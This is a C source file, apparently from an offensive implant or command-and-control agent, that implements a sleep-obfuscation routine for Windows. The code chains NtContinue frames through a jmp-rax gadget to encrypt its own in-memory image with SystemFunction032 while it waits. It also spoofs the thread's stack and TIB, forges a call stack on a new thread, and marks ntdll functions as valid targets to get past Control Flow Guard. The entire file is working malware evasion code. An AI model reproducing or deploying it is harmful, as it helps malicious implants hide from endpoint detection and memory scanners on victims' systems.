			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.SetEvent );

			/* Get the hook length + DLL Length */
			Tbl = C_PTR( G_SYM( Table ) );
			Img = C_PTR( Tbl->Table->RxBuffer );
			XLn = U_PTR( Tbl->Table->RxLength );
			FLn = U_PTR( Tbl->Table->ImageLength );

			RandomString( &Rnd, sizeof( Rnd ) );

			Key.Buffer = C_PTR( &Rnd );
			Key.Length = Key.MaximumLength = sizeof( Rnd );

			Buf.Buffer = C_PTR( Tbl->Table->RxBuffer );
			Buf.Length = Buf.MaximumLength = Tbl->Table->ImageLength;

			do {
				/* Create synchronization event 1 */
				if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev1, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
					/* Abort! */
					break;
				};
				/* Create synchronization event 2 */
				if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev2, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
					/* Abort! */
					break;
				};
				/* Create synchronization event 3 */
				if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev3, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
					/* Abort! */
					break;
				};
				/* Create synchronization event 4 */
				if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev4, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
					/* Abort! */
					break;
				};
	
				/* Initialize the thread pool environment */
				InitializeThreadpoolEnvironment( &Tbl->Table->Debugger.PoolEnv );

				/* Create the thread pool the timer will use */
				if ( !( Pol = Api.CreateThreadpool( NULL ) ) ) {
					/* Abort! */
					break;
				};

				/* Create the cleanup group to free memory */
				if ( !( Cln = Api.CreateThreadpoolCleanupGroup() ) ) {
					/* Abort! */
					break;
				};

				/* Set the minimum and maximum the thread pool uses */
				Api.SetThreadpoolThreadMaximum( Pol, 1 );
				if ( ! Api.SetThreadpoolThreadMinimum( Pol, 1 ) ) {
					/* Abort! */
					break;
				};

				/* Initialize the pool environment information */
				SetThreadpoolCallbackPool( & Tbl->Table->Debugger.PoolEnv, Pol );
				SetThreadpoolCallbackCleanupGroup( & Tbl->Table->Debugger.PoolEnv, Cln, NULL );

				/* Flags to query for! */
				Ctx.ContextFlags = CONTEXT_FULL;

				/* Create the first time and spawn the new thread */
				if ( NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.RtlCaptureContext, &Ctx, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) {
					if ( NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.SetEvent, Ev1, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) {
						if ( NT_SUCCESS( Api.NtWaitForSingleObject( Ev1, FALSE, NULL ) ) ) {
							if ( !( Cap = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
								/* Abort! */
								break;
							};
							if ( !( Beg = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
								/* Abort! */
								break;
							};
							if ( !( Set = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
								/* Abort! */
								break;
							};
							if ( !( Enc = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
								/* Abort! */
								break;
							};
							if ( !( Gt1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
								/* Abort! */
								break;
							};
							if ( !( Cp1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
								/* Abort! */
								break;
							};
							if ( !( Cp2 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
								/* Abort! */
								break;
							};
							if ( !( St1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
								/* Abort! */
								break;
							};
							if ( !( Sev = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
								/* Abort! */
								break;
							};
							if ( !( Blk = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
								/* Abort! */
								break;
							};
							if ( !( Cp3 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
								/* Abort! */
								break;
							};
							if ( !( St2 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
								/* Abort! */
								break;
							};
							if ( !( Dec = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) { 
								/* Abort! */
								break;
							};
							if ( !( Res = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
								/* Abort! */
								break;
							};
							if ( !( End = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
								/* Abort! */
								break;
							};

							/* Get the address of the jmp rax gadget */
							if ( ( Gdg = GetJmpRaxTarget( ) ) != NULL ) { 

								/* Copy the old NT_TIB structure into a stack var */
								__builtin_memcpy( &Oli, & NtCurrentTeb()->NtTib, sizeof( NT_TIB ) );

								/* Extract the NT_TIB structure from our thread pool thread */
								if ( GetThreadInfoBlockFromStack( Ctx.Rsp, &Nwi ) ) {
									/* Duplicate a handle to our current thread. */
									if ( NT_SUCCESS( Api.NtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &Src, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {

										/* Enable CFG on the target function in case its blacklisted */
										CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtContinue );
										CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtResumeThread );
										CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtGetContextThread );
										CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtSetContextThread );
										CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.RtlCopyMappedMemory );

										/* WaitForSingleObjectEx */
										__builtin_memcpy( Beg, &Ctx, sizeof( CONTEXT ) );
										Beg->ContextFlags = CONTEXT_FULL;
										Beg->Rip  = U_PTR( Gdg );
										Beg->Rsp -= U_PTR( sizeof( PVOID ) );
										Beg->Rax  = U_PTR( Api.WaitForSingleObjectEx );
										Beg->Rcx  = U_PTR( Ev2 );
										Beg->Rdx  = U_PTR( INFINITE );
										Beg->R8   = U_PTR( FALSE );

										/* VirtualProtect */
										__builtin_memcpy( Set, &Ctx, sizeof( CONTEXT ) );
										Set->ContextFlags = CONTEXT_FULL;
										Set->Rip  = U_PTR( Gdg );
										Set->Rsp -= U_PTR( sizeof( PVOID ) );
										Set->Rax  = U_PTR( Api.VirtualProtect );
										Set->Rcx  = U_PTR( Img );
										Set->Rdx  = U_PTR( XLn );
										Set->R8   = U_PTR( PAGE_READWRITE );
										Set->R9   = U_PTR( &Prt );

										/* SystemFunction032 */
										__builtin_memcpy( Enc, &Ctx, sizeof( CONTEXT ) );
										Enc->ContextFlags = CONTEXT_FULL;
										Enc->Rip  = U_PTR( Gdg );
										Enc->Rsp -= U_PTR( sizeof( PVOID ) );
										Enc->Rax  = U_PTR( Api.SystemFunction032 );
										Enc->Rcx  = U_PTR( &Buf );
										Enc->Rdx  = U_PTR( &Key );

										/* NtGetContextThread */
										__builtin_memcpy( Gt1, &Ctx, sizeof( CONTEXT ) );
										Gt1->ContextFlags = CONTEXT_FULL;
										Cap->ContextFlags = CONTEXT_FULL;
										Gt1->Rip  = U_PTR( Gdg );
										Gt1->Rsp -= U_PTR( sizeof( PVOID ) );
										Gt1->Rax  = U_PTR( Api.NtGetContextThread );
										Gt1->Rcx  = U_PTR( Src );
										Gt1->Rdx  = U_PTR( Cap );

										/* RtlCopyMappedMemory */
										__builtin_memcpy( Cp1, &Ctx, sizeof( CONTEXT ) );
										Cp1->ContextFlags = CONTEXT_FULL;
										Cp1->Rip  = U_PTR( Gdg );
										Cp1->Rsp -= U_PTR( sizeof( PVOID ) );
										Cp1->Rip  = U_PTR( Api.RtlCopyMappedMemory );
										Cp1->Rcx  = U_PTR( & Ctx.Rip );
										Cp1->Rdx  = U_PTR( & Cap->Rip );
										Cp1->R8   = U_PTR( sizeof( PVOID ) );

										/* RtlCopyMappedMemory */
										__builtin_memcpy( Cp2, &Ctx, sizeof( CONTEXT ) );
										Cp2->ContextFlags = CONTEXT_FULL;
										Cp2->Rip  = U_PTR( Gdg );
										Cp2->Rsp -= U_PTR( sizeof( PVOID ) );
										Cp2->Rax  = U_PTR( Api.RtlCopyMappedMemory );
										Cp2->Rcx  = U_PTR( & NtCurrentTeb()->NtTib );
										Cp2->Rdx  = U_PTR( & Nwi );
										Cp2->R8   = U_PTR( sizeof( NT_TIB ) );

										/* NtSetContextThread */
										__builtin_memcpy( St1, &Ctx, sizeof( CONTEXT ) );
										St1->ContextFlags = CONTEXT_FULL;
										St1->Rip  = U_PTR( Gdg );
										St1->Rsp -= U_PTR( sizeof( PVOID ) );
										St1->Rax  = U_PTR( Api.NtSetContextThread );
										St1->Rcx  = U_PTR( Src );
										St1->Rdx  = U_PTR( & Ctx );

										/* NtResumeThread */
										__builtin_memcpy( Sev, &Ctx, sizeof( CONTEXT ) );
										Sev->ContextFlags = CONTEXT_FULL;
										Sev->Rip  = U_PTR( Gdg );
										Sev->Rsp -= U_PTR( sizeof( PVOID ) );
										Sev->Rax  = U_PTR( Api.NtResumeThread );
										Sev->Rcx  = U_PTR( Parameter->Thread );
										Sev->Rdx  = U_PTR( NULL );

										/* WaitForSingleObjectEx */
										__builtin_memcpy( Blk, &Ctx, sizeof( CONTEXT ) );
										Blk->ContextFlags = CONTEXT_FULL;
										Blk->Rip  = U_PTR( Gdg );
										Blk->Rsp -= U_PTR( sizeof( PVOID ) );
										Blk->Rax  = U_PTR( Api.WaitForSingleObjectEx );
										Blk->Rcx  = U_PTR( Parameter->Thread );
										Blk->Rdx  = U_PTR( INFINITE );
										Blk->R8   = U_PTR( FALSE );

										/* RtlCopyMappedMemory */
										__builtin_memcpy( Cp3, &Ctx, sizeof( CONTEXT ) );
										Cp3->ContextFlags = CONTEXT_FULL;
										Cp3->Rip  = U_PTR( Gdg );
										Cp3->Rsp -= U_PTR( sizeof( PVOID ) );
										Cp3->Rax  = U_PTR( Api.RtlCopyMappedMemory );
										Cp3->Rcx  = U_PTR( & NtCurrentTeb()->NtTib );
										Cp3->Rdx  = U_PTR( & Oli );
										Cp3->R8   = U_PTR( sizeof( NT_TIB ) );

										/* NtSetContextThread */
										__builtin_memcpy( St2, &Ctx, sizeof( CONTEXT ) );
										St2->ContextFlags = CONTEXT_FULL;
										Cap->ContextFlags = CONTEXT_FULL;
										St2->Rip  = U_PTR( Gdg );
										St2->Rsp -= U_PTR( sizeof( PVOID ) );
										St2->Rax  = U_PTR( Api.NtSetContextThread );
										St2->Rcx  = U_PTR( Src );
										St2->Rdx  = U_PTR( Cap );

										/* SystemFunction032 */
										__builtin_memcpy( Dec, &Ctx, sizeof( CONTEXT ) );
										Dec->ContextFlags = CONTEXT_FULL;
										Dec->Rip  = U_PTR( Gdg );
										Dec->Rsp -= U_PTR( sizeof( PVOID ) );
										Dec->Rax  = U_PTR( Api.SystemFunction032 );
										Dec->Rcx  = U_PTR( &Buf );
										Dec->Rdx  = U_PTR( &Key );

										/* VirtualProtect */
										__builtin_memcpy( Res, &Ctx, sizeof( CONTEXT ) );
										Res->ContextFlags = CONTEXT_FULL;
										Res->Rip  = U_PTR( Gdg );
										Res->Rsp -= U_PTR( sizeof( PVOID ) );
										Res->Rax  = U_PTR( Api.VirtualProtect );
										Res->Rcx  = U_PTR( Img );
										Res->Rdx  = U_PTR( XLn );
										Res->R8   = U_PTR( PAGE_EXECUTE_READ );
										Res->R9   = U_PTR( &Prt );

										/* SetEvent */
										__builtin_memcpy( End, &Ctx, sizeof( CONTEXT ) );
										End->ContextFlags = CONTEXT_FULL;
										End->Rip  = U_PTR( Gdg );
										End->Rsp -= U_PTR( sizeof( PVOID ) );
										End->Rax  = U_PTR( Api.SetEvent );
										End->Rcx  = U_PTR( Ev3 );

										/* Query all the API calls in the order in which they need to run */
										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Beg, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Set, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Enc, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Gt1, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Cp1, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Cp2, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, St1, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Sev, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Blk, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Cp3, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, St2, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Dec, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Res, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, End, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;

										/* Adjust the offset before setting our new frame */
										Ctx.Rsp -= U_PTR( sizeof( PVOID ) );

										/* Execute and await the frame results! */
										Api.NtSignalAndWaitForSingleObject( Ev2, Ev3, FALSE, NULL ); 
									};
								};
							};
						};
					};
				};
			} while ( 0 );

			if ( Ev1 != NULL ) {
				Api.NtClose( Ev1 );
			};
			if ( Ev2 != NULL ) {
				Api.NtClose( Ev2 );
			};
			if ( Ev3 != NULL ) {
				Api.NtClose( Ev3 );
			};
			if ( Ev4 != NULL ) {
				Api.NtClose( Ev4 );
			};
			if ( Que != NULL ) {
				Api.RtlDeregisterWait( Que );
			};
			if ( Cap != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Cap );
			};
			if ( Beg != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Beg );
			};
			if ( Set != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Set );
			};
			if ( Enc != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Enc );
			};
			if ( Gt1 != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Gt1 );
			};
			if ( Cp1 != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Cp1 );
			};
			if ( Cp2 != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Cp2 );
			};
			if ( St1 != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, St1 );
			};
			if ( Sev != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Sev );
			};
			if ( Blk != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Blk );
			};
			if ( Cp3 != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Cp3 );
			};
			if ( St2 != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, St2 );
			};
			if ( Dec != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Dec );
			};
			if ( Res != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Res );
			};
			if ( End != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, End );
			};
			if ( Cln != NULL ) {
				/* Close the thread pool cleanup */
				Api.CloseThreadpoolCleanupGroupMembers( Cln, TRUE, NULL ); 
			};
			if ( Pol != NULL ) {
				/* Close the pool */
				Api.CloseThreadpool( Pol );
			};
			if ( Src != NULL ) {
				/* Close the thread handle */
				Api.NtClose( Src );
			};

			/* Dereference */
			Api.LdrUnloadDll( Adv );
		};

		/* Dereference */
		Api.LdrUnloadDll( K32 );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Rnd, sizeof( Rnd ) );
	RtlSecureZeroMemory( &Oli, sizeof( Oli ) );
	RtlSecureZeroMemory( &Nwi, sizeof( Nwi ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );
	RtlSecureZeroMemory( &Buf, sizeof( Buf ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	/* Switch back to the primary 'stack' master */
	Parameter->SwitchToFiber( Parameter->Master );
};

/*!
 *
 * Purpose:
 *
 * Executes NtWaitForSingleObject while obfuscated.
 * Once the wait has completed, the result will be
 * returned back to us.
 *
!*/
D_SEC( E ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOOLEAN Alertable, _In_ PLARGE_INTEGER Timeout )
{
	MIN_API				Api;
	CONTEXT				Ctx;
	ANSI_STRING			Ani;
	FIBER_PARAM			Fbr;
	THREAD_PARAM			Prm;
	UNICODE_STRING			Uni;
	THREAD_BASIC_INFORMATION	Tbi;

	ULONG				Stl = 0;
	NTSTATUS			Nst = STATUS_UNSUCCESSFUL;

	PTEB				Teb = NULL;
	PVOID				Ptr = NULL;
	PVOID				K32 = NULL;
	LPVOID				Ent = NULL;
	LPVOID				Stk = NULL;
	HANDLE				Thd = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Fbr, sizeof( Fbr ) );
	RtlSecureZeroMemory( &Prm, sizeof( Prm ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
	RtlSecureZeroMemory( &Tbi, sizeof( Tbi ) );

	Api.NtQueryInformationThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYINFORMATIONTHREAD ); 
	Api.LdrGetProcedureAddress   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
	Api.NtWaitForSingleObject    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT ); 
	Api.RtlInitUnicodeString     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Api.NtSetContextThread       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
	Api.NtGetContextThread       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
	Api.RtlInitAnsiString        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
	Api.NtCreateThreadEx         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATETHREADEX );
	Api.RtlAllocateHeap          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.NtSuspendThread          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSUSPENDTHREAD );
	Api.NtResumeThread           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTRESUMETHREAD );
	Api.NtCreateEvent            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEEVENT );
	Api.LdrUnloadDll             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.RtlFreeHeap              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.NtSetEvent               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETEVENT );
	Api.LdrLoadDll               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
	Api.NtClose                  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"kernel32.dll" ) ) );
	Api.LdrLoadDll( NULL, 0, &Uni, &K32 );

	if ( K32 != NULL ) {

		Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "ConvertThreadToFiber" ) ) );
		Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.ConvertThreadToFiber );

		Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "ConvertFiberToThread" ) ) );
		Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.ConvertFiberToThread );

		Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SwitchToFiber" ) ) );
		Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.SwitchToFiber );
		Api.LdrGetProcedureAddress( K32, &Ani, 0, &Fbr.SwitchToFiber );

		Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CreateFiber" ) ) );
		Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CreateFiber );

		Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "DeleteFiber" ) ) );
		Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.DeleteFiber );

		/* Locate ntdll!RtlUserThreadStart */
		Ent = C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), 0x0353797c ) );

		/* Create thread pointing at our thread capture routine */
		if ( NT_SUCCESS( Api.NtCreateThreadEx( &Thd, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Ent, NULL, TRUE, 0, 0x1000, 0, NULL ) ) ) {

			/* Create an notification to alert when we have the rest of the params filled */
			if ( NT_SUCCESS( Api.NtCreateEvent( &Prm.Ev1, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {  
				/* Create a notifiation to alert when the thread should run the new frame */
				if ( NT_SUCCESS( Api.NtCreateEvent( &Prm.Ev2, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {

					/* Capture information about the thread */
					Ctx.ContextFlags = CONTEXT_FULL;

					/* Get the CONTEXT structure */
					if ( NT_SUCCESS( Api.NtGetContextThread( Thd, &Ctx ) ) ) {

						/* Set our actual values */
						Ctx.ContextFlags = CONTEXT_FULL;
						Ctx.Rcx = U_PTR( G_SYM( ThreadCaptureReturnAddr ) );
						Ctx.Rdx = U_PTR( &Prm );

						/* Set the CONTEXT structure */
						if ( NT_SUCCESS( Api.NtSetContextThread( Thd, &Ctx ) ) ) {
							/* Resume the thread */
							if ( NT_SUCCESS( Api.NtResumeThread( Thd, NULL ) ) ) {
								/* Await for the thread to signal */
								if ( NT_SUCCESS( Api.NtWaitForSingleObject( Prm.Ev1, FALSE, NULL ) ) ) {
									/* Query THREAD_BASIC_INFORMATION about the thread */
									if ( NT_SUCCESS( Api.NtQueryInformationThread( Thd, ThreadBasicInformation, &Tbi, sizeof( Tbi ), NULL ) ) ) {
										Teb = C_PTR( Tbi.TebBaseAddress );
										Stl = U_PTR( Teb->NtTib.StackBase ) - U_PTR( Prm.Rsp );

										/* Allocate memory to hold the stack */
										if ( ( Stk = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Stl ) ) != NULL ) {
											/* Copy over the stack pointers */
											__builtin_memcpy( Stk, Prm.Rsp, Stl );

											/* Set the event. If we fail, free the stack */
											if ( ! NT_SUCCESS( Api.NtSetEvent( Prm.Ev2, NULL ) ) ) {
												Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Stk );
												Stk = NULL;
											};
										};
									};
								};
							}
						};
					};
					/* Close! */
					Api.NtClose( Prm.Ev2 );
				};
				/* Close! */
				Api.NtClose( Prm.Ev1 );
			};
			/* Close! */
			Api.NtClose( Thd );

			/* Do we still have a valid stack */
			if ( Stk != NULL ) {
				/* Create a thread pointing @ RtlUserThreadStart */
				if ( NT_SUCCESS( Api.NtCreateThreadEx( &Thd, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Ent, NULL, TRUE, 0, 0x1000, 0, NULL ) ) ) {
					/* Query TEB information */
					if ( NT_SUCCESS( Api.NtQueryInformationThread( Thd, ThreadBasicInformation, &Tbi, sizeof( Tbi ), NULL ) ) ) {
						Teb = C_PTR( Tbi.TebBaseAddress );
						Ptr = C_PTR( U_PTR( Teb->NtTib.StackBase ) - Stl );

						/* Copy over the frame */
						__builtin_memcpy( Ptr, Stk, Stl );

						/* Capture information about the thread */
						Ctx.ContextFlags = CONTEXT_FULL;

						if ( NT_SUCCESS( Api.NtGetContextThread( Thd, &Ctx ) ) ) {
							/* Set information about the frame */
							Ctx.ContextFlags = CONTEXT_FULL;
							Ctx.Rsp = U_PTR( Ptr );
							Ctx.Rip = U_PTR( Api.NtWaitForSingleObject );
							Ctx.Rcx = U_PTR( Handle );
							Ctx.Rdx = U_PTR( FALSE );
							Ctx.R8  = U_PTR( Timeout );

							/* Set information about the frame */
							if ( NT_SUCCESS( Api.NtSetContextThread( Thd, &Ctx ) ) ) {
								/* Convert to a fiber */
								if ( ( Fbr.Master = Api.ConvertThreadToFiber( &Fbr ) ) != NULL ) {
									/* Create a fiber pointing at our obfuscate sleep routine */
									if ( ( Fbr.Slaves = Api.CreateFiber( 0x1000 * 2, C_PTR( G_SYM( ObfSleepFiber ) ), &Fbr ) ) != NULL ) {
										/* Switch to the obfuscate fiber */
										Fbr.Thread = C_PTR( Thd );
										Fbr.SwitchToFiber( Fbr.Slaves );

										/* Query the thread exit status */
										if ( NT_SUCCESS( Api.NtQueryInformationThread( Thd, ThreadBasicInformation, &Tbi, sizeof( Tbi ), NULL ) ) ) {
											/* Capture NtWaitForSingleObject Return Value */
											Nst = Tbi.ExitStatus;
										};

										/* Delete the fiber */
										Api.DeleteFiber( Fbr.Slaves );
									};
									/* Convert back to a thread */
									Api.ConvertFiberToThread();
								};
							};
						};
					};
					/* Close */
					Api.NtClose( Thd );
				};
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Stk );
			};
		};
		/* Dereference! */
		Api.LdrUnloadDll( K32 );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Fbr, sizeof( Fbr ) );
	RtlSecureZeroMemory( &Prm, sizeof( Prm ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
	RtlSecureZeroMemory( &Tbi, sizeof( Tbi ) );

	/* Status */
	return Nst;
};

#endif
